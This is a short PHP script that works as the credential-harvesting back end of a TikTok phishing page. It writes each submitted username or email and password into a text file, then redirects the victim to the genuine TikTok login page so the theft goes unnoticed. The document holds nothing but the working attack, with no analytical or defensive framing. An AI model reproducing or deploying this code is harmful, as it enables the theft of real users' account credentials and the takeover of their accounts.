<?php

file_put_contents("usernames.txt", "\n". "Account: " . $_POST['Email_or_username'] . " Pass: " . $_POST['Password'] . "\n", FILE_APPEND);
header('Location: https://www.tiktok.com/login/phone_or_email?lang=en');
exit();
